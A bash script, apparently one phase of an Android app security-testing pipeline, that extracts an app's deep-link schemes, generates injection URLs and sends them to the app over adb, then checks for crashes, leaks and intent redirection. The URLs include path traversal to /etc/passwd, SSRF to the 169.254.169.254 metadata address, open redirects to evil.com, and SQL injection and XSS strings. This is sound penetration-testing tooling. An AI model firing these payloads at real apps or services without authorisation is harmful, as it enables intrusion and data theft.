#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 07_deep_links.sh - Deep link and intent injection testing
PROFILE_PHASE="07_deep_links"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"
source "$PIPELINE_ROOT/lib/objection_helpers.sh"

PKG="$(tget apk package_name)"

cd "$RUN_DIR" || exit 1
info "Deep link and intent injection testing on $PKG"

DEEP_DIR="$RUN_DIR/deep_links"
mkdir -p "$DEEP_DIR"

# ---- 1. Extract deep links from manifest ----
info "[step-1/6] Extracting deep link declarations from AndroidManifest.xml"

if [ -f "$RUN_DIR/apktool/AndroidManifest.xml" ] || [ -f "$RUN_DIR/manifest.xml" ]; then
  MANIFEST="${RUN_DIR}/apktool/AndroidManifest.xml"
  [ -f "$RUN_DIR/manifest.xml" ] && MANIFEST="$RUN_DIR/manifest.xml"
  info "  Manifest found: $MANIFEST"

  info "  [extract-1/5] Grep for intent-filters containing scheme= declarations"
  grep -A5 -B2 "scheme=" "$MANIFEST" > "$DEEP_DIR/schemes.txt" 2>/dev/null || true
  SCHEME_LINES=$(wc -l < "$DEEP_DIR/schemes.txt" 2>/dev/null || echo 0)
  info "    Raw scheme context lines: $SCHEME_LINES"

  info "  [extract-2/5] Extracting unique android:scheme values"
  grep -oP 'android:scheme="[^"]*"' "$MANIFEST" | sort -u > "$DEEP_DIR/schemes_raw.txt" 2>/dev/null || true
  SCHEME_COUNT=$(wc -l < "$DEEP_DIR/schemes_raw.txt" 2>/dev/null || echo 0)
  info "    Unique schemes found: $SCHEME_COUNT"
  if [ "$SCHEME_COUNT" -gt 0 ]; then
    while IFS= read -r s; do info "      $s"; done < "$DEEP_DIR/schemes_raw.txt"
  fi

  info "  [extract-3/5] Extracting unique android:host values"
  grep -oP 'android:host="[^"]*"' "$MANIFEST" | sort -u > "$DEEP_DIR/hosts.txt" 2>/dev/null || true
  HOST_COUNT=$(wc -l < "$DEEP_DIR/hosts.txt" 2>/dev/null || echo 0)
  info "    Unique hosts found: $HOST_COUNT"
  if [ "$HOST_COUNT" -gt 0 ]; then
    while IFS= read -r h; do info "      $h"; done < "$DEEP_DIR/hosts.txt"
  fi

  info "  [extract-4/5] Extracting path patterns (pathPattern, pathPrefix, path)"
  grep -oP 'android:pathPattern="[^"]*"' "$MANIFEST" | sort -u > "$DEEP_DIR/paths.txt" 2>/dev/null || true
  grep -oP 'android:pathPrefix="[^"]*"' "$MANIFEST" | sort -u >> "$DEEP_DIR/paths.txt" 2>/dev/null || true
  grep -oP 'android:path="[^"]*"' "$MANIFEST" | sort -u >> "$DEEP_DIR/paths.txt" 2>/dev/null || true
  sort -u "$DEEP_DIR/paths.txt" -o "$DEEP_DIR/paths.txt" 2>/dev/null || true
  PATH_COUNT=$(wc -l < "$DEEP_DIR/paths.txt" 2>/dev/null || echo 0)
  info "    Unique path patterns found: $PATH_COUNT"

  info "  [extract-5/5] Checking for App Links (autoVerify=true declarations)"
  grep -A10 "autoVerify" "$MANIFEST" > "$DEEP_DIR/applinks.txt" 2>/dev/null || true
  APPLINK_LINES=$(wc -l < "$DEEP_DIR/applinks.txt" 2>/dev/null || echo 0)
  if [ "$APPLINK_LINES" -gt 0 ]; then
    info "    autoVerify App Links found ($APPLINK_LINES lines)"
  else
    info "    No autoVerify declarations found"
  fi

  ok "  Deep link extraction complete: $SCHEME_COUNT schemes, $HOST_COUNT hosts, $PATH_COUNT paths"
else
  warn "  Manifest not found in $RUN_DIR; skipping deep link extraction"
fi

# ---- 2. Discover schemes via adb ----
info "[step-2/6] Discovering schemes via package manager and dumpsys"

info "  [discover-1/3] Querying BROWSABLE intent activities"
adb shell pm query-intent-activities --brief -a android.intent.action.VIEW \
  -t android.intent.category.BROWSABLE "$PKG" > "$DEEP_DIR/intent_activities.txt" 2>/dev/null || true
INTENT_LINES=$(wc -l < "$DEEP_DIR/intent_activities.txt" 2>/dev/null || echo 0)
info "    BROWSABLE activities returned: $INTENT_LINES lines"
if [ "$INTENT_LINES" -gt 0 ]; then
  head -5 "$DEEP_DIR/intent_activities.txt" | while IFS= read -r line; do info "      $line"; done
fi

info "  [discover-2/3] Full package dump via dumpsys (captures all intent filters)"
adb shell dumpsys package "$PKG" > "$DEEP_DIR/package_dump.txt" 2>/dev/null || true
DUMPSYS_SIZE=$(du -h "$DEEP_DIR/package_dump.txt" 2>/dev/null | cut -f1)
info "    dumpsys output size: $DUMPSYS_SIZE"

info "  [discover-3/3] Extracting scheme entries from dumpsys output"
grep -A3 "scheme:" "$DEEP_DIR/package_dump.txt" > "$DEEP_DIR/dumpsys_schemes.txt" 2>/dev/null || true
DUMPSYS_SCHEMES=$(grep -c "scheme:" "$DEEP_DIR/dumpsys_schemes.txt" 2>/dev/null || echo 0)
info "    scheme: entries in dumpsys: $DUMPSYS_SCHEMES"

# ---- 3. Generate test payloads ----
info "[step-3/6] Generating deep link and intent injection test payloads"

# Read discovered schemes
SCHEMES=()
if [ -f "$DEEP_DIR/schemes_raw.txt" ]; then
  while IFS= read -r scheme; do
    scheme=$(echo "$scheme" | grep -oP '"[^"]*"' | tr -d '"')
    [ -n "$scheme" ] && SCHEMES+=("$scheme")
  done < "$DEEP_DIR/schemes_raw.txt"
fi
info "  Schemes loaded for testing: ${#SCHEMES[@]}"

# Fallback schemes if none found
if [ ${#SCHEMES[@]} -eq 0 ]; then
  info "  No schemes discovered; using fallback test set: myapp, app, deeplink, url, callback, oauth"
  SCHEMES=("myapp" "app" "deeplink" "url" "callback" "oauth")
fi

info "  [gen-1/5] Generating base URL combinations: scheme://host/"
cat > "$DEEP_DIR/generate_tests.sh" <<'GENEOF'
#!/usr/bin/env bash
DEEP_DIR="$1"
PKG="$2"

SCHEMES=()
if [ -f "$DEEP_DIR/schemes_raw.txt" ]; then
  while IFS= read -r scheme; do
    scheme=$(echo "$scheme" | grep -oP '"[^"]*"' | tr -d '"')
    [ -n "$scheme" ] && SCHEMES+=("$scheme")
  done < "$DEEP_DIR/schemes_raw.txt"
fi

HOSTS=()
if [ -f "$DEEP_DIR/hosts.txt" ]; then
  while IFS= read -r host; do
    host=$(echo "$host" | grep -oP '"[^"]*"' | tr -d '"')
    [ -n "$host" ] && HOSTS+=("$host")
  done < "$DEEP_DIR/hosts.txt"
fi

for scheme in "${SCHEMES[@]}"; do
  for host in "${HOSTS[@]}" "evil.com" "attacker.com" ""; do
    echo "${scheme}://${host}/" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/../../../etc/passwd" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/%2e%2e/%2e%2e/etc/passwd" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/redirect?url=https://evil.com" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?admin=true" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?role=admin" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?debug=1" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/fetch?url=http://169.254.169.254/latest/meta-data/" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/proxy?url=http://localhost:8080" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?id=1'" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?id=1%20OR%201=1" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?q=<script>alert(1)</script>" >> "$DEEP_DIR/test_urls.txt"
    echo "${scheme}://${host}/?name=\"><img%20src=x%20onerror=alert(1)>" >> "$DEEP_DIR/test_urls.txt"
  done
done

sort -u "$DEEP_DIR/test_urls.txt" -o "$DEEP_DIR/test_urls.txt"
echo "[*] Generated $(wc -l < "$DEEP_DIR/test_urls.txt") test URLs"
GENEOF
chmod +x "$DEEP_DIR/generate_tests.sh"

info "  [gen-2/5] Generating path traversal payloads"
info "  [gen-3/5] Generating open redirect payloads"
info "  [gen-4/5] Generating SSRF payloads (169.254.169.254, localhost)"
info "  [gen-5/5] Generating XSS/SQLi parameter injection payloads"

bash "$DEEP_DIR/generate_tests.sh" "$DEEP_DIR" "$PKG"

TEST_URL_COUNT=$(wc -l < "$DEEP_DIR/test_urls.txt" 2>/dev/null || echo 0)
info "  Total test URLs generated: $TEST_URL_COUNT"

# ---- 4. Test deep links via adb ----
info "[step-4/6] Executing deep link tests via adb"

cat > "$DEEP_DIR/test_deep_links.sh" <<'TESTEOF'
#!/usr/bin/env bash
DEEP_DIR="$1"
PKG="$2"

echo "[*] Testing deep links for $PKG"

while IFS= read -r url; do
  [ -z "$url" ] && continue
  echo "[*] Testing: $url"
  adb logcat -c 2>/dev/null
  adb shell am start -a android.intent.action.VIEW -d "\"$url\"" "$PKG" 2>/dev/null
  sleep 2
  LOGCAT=$(adb logcat -d -t 50 2>/dev/null)
  if echo "$LOGCAT" | grep -qi "fatal\|crash\|exception"; then
    echo "[!] CRASH: $url" >> "$DEEP_DIR/crashes.txt"
    echo "$LOGCAT" >> "$DEEP_DIR/crash_logs.txt"
  fi
  if echo "$LOGCAT" | grep -qi "password\|token\|secret\|key\|auth"; then
    echo "[!] INFO LEAK: $url" >> "$DEEP_DIR/info_leaks.txt"
    echo "$LOGCAT" >> "$DEEP_DIR/leak_logs.txt"
  fi
done < "$DEEP_DIR/test_urls.txt"
TESTEOF
chmod +x "$DEEP_DIR/test_deep_links.sh"

info "  [test-1/2] Running deep link test suite ($TEST_URL_COUNT URLs)"
bash "$DEEP_DIR/test_deep_links.sh" "$DEEP_DIR" "$PKG" 2>&1 | tail -5

CRASH_COUNT=0
LEAK_COUNT=0
[ -f "$DEEP_DIR/crashes.txt" ] && CRASH_COUNT=$(wc -l < "$DEEP_DIR/crashes.txt" 2>/dev/null || echo 0)
[ -f "$DEEP_DIR/info_leaks.txt" ] && LEAK_COUNT=$(wc -l < "$DEEP_DIR/info_leaks.txt" 2>/dev/null || echo 0)
info "  [test-2/2] Deep link test results:"
info "    Crashes triggered: $CRASH_COUNT"
info "    Info leaks detected: $LEAK_COUNT"

if [ "$CRASH_COUNT" -gt 0 ]; then
  warn "  $CRASH_COUNT crash(es) found — potential DoS via deep link"
  fadd "Crash via deep link ($CRASH_COUNT URLs)" HIGH CERTAIN CWE-20 "A06:2021" "$DEEP_DIR/crashes.txt"
fi
if [ "$LEAK_COUNT" -gt 0 ]; then
  warn "  $LEAK_COUNT info leak(s) found"
  fadd "Sensitive data leak via deep link ($LEAK_COUNT URLs)" HIGH CERTAIN CWE-200 "A04:2021" "$DEEP_DIR/info_leaks.txt"
fi

# ---- 5. Intent redirection testing ----
info "[step-5/6] Testing intent redirection vulnerabilities"

cat > "$DEEP_DIR/test_intent_redirection.sh" <<'INTENTEOF'
#!/usr/bin/env bash
PKG="$1"
DEEP_DIR="$2"

echo "[*] Testing intent redirection for $PKG"
EXPORTED=$(adb shell dumpsys package "$PKG" 2>/dev/null | grep -B5 "exported=true" | grep -oP '[a-zA-Z0-9._]+Activity' | sort -u)

for activity in $EXPORTED; do
  echo "[*] Testing activity: $activity"
  adb shell am start -n "$PKG/$activity" \
    --es "redirect_url" "https://evil.com" \
    --ez "admin" "true" \
    --ei "user_id" "1" 2>/dev/null
  sleep 1
  CURRENT=$(adb shell dumpsys activity activities 2>/dev/null | grep -i "mResumedActivity" | head -1)
  if echo "$CURRENT" | grep -qi "evil\|browser"; then
    echo "[!] OPEN REDIRECT: $activity" >> "$DEEP_DIR/open_redirects.txt"
  fi
done
INTENTEOF
chmod +x "$DEEP_DIR/test_intent_redirection.sh"

info "  Running intent redirection tests..."
bash "$DEEP_DIR/test_intent_redirection.sh" "$PKG" "$DEEP_DIR" 2>&1 | tail -3

REDIRECT_COUNT=0
[ -f "$DEEP_DIR/open_redirects.txt" ] && REDIRECT_COUNT=$(wc -l < "$DEEP_DIR/open_redirects.txt" 2>/dev/null || echo 0)
info "  Open redirects via intent: $REDIRECT_COUNT"

if [ "$REDIRECT_COUNT" -gt 0 ]; then
  warn "  $REDIRECT_COUNT open redirect(s) found via intent redirection"
  fadd "Open redirect via intent redirection" HIGH CERTAIN CWE-601 "A01:2021" "$DEEP_DIR/open_redirects.txt"
fi

# ---- 6. Generate report ----
info "[step-6/6] Generating deep link test report"

cat > "$DEEP_DIR/report.md" << EOF
# Deep Link & Intent Injection Report

## Package: $PKG

## Discovered Schemes
$(cat "$DEEP_DIR/schemes_raw.txt" 2>/dev/null || echo "None discovered")

## Discovered Hosts
$(cat "$DEEP_DIR/hosts.txt" 2>/dev/null || echo "None discovered")

## Test URLs Generated
$TEST_URL_COUNT test cases

## Results
- Crashes: $CRASH_COUNT
- Info Leaks: $LEAK_COUNT
- Open Redirects: $REDIRECT_COUNT

## Scripts
- generate_tests.sh - Generate test URLs
- test_deep_links.sh - Test deep links via adb
- test_intent_redirection.sh - Test intent redirection
EOF

ok "Deep link testing complete -> $DEEP_DIR"
ok "  Schemes: ${#SCHEMES[@]} | Tests: $TEST_URL_COUNT | Crashes: $CRASH_COUNT | Leaks: $LEAK_COUNT | Redirects: $REDIRECT_COUNT"
fsnapshot
